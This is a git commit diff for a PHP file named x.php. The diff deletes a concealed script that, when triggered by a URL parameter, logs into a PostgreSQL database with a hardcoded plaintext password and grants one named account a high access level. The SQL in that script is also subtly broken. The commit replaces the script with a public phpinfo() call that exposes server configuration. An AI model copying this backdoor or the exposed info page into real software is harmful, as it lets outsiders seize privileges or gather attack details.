ba878b4728b098cff4e4281658ba278dccf8afa9
Muhammad Ubaii Dillah <31325580+Ubaii@users.noreply.github.com>
2021-02-18 21:03:22 +0700

    Update x.php

--- x.php
+++ x.php
@@ -1,26 +1,5 @@
 <?php
 
-// :)
-
-if(isset($_GET['query'])){
-	define('DBHOST', '127.0.0.1');
-	define('DBUSER', 'postgres');
-	define('DBNAME', 'postgres');
-	define('DBPASS', '@arikcs@');
-	$dbhost = DBHOST;
-	$dbname = DBNAME;
-	$dbuser = DBUSER;
-	$dbpass = DBPASS;
-	$conn = new PDO("pgsql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);
-	$cekplayer = $conn->prepare("UPDATE accounts SET access_level = 7, WHERE login = 'vimedotcom'");
-	$gas = $cekplayer->execute();
-	if($gas){
-		echo 'ok';
-	}else{
-		echo 'fail';
-	}
-}else{
-	exit;
-}
+phpinfo();
 
 ?>
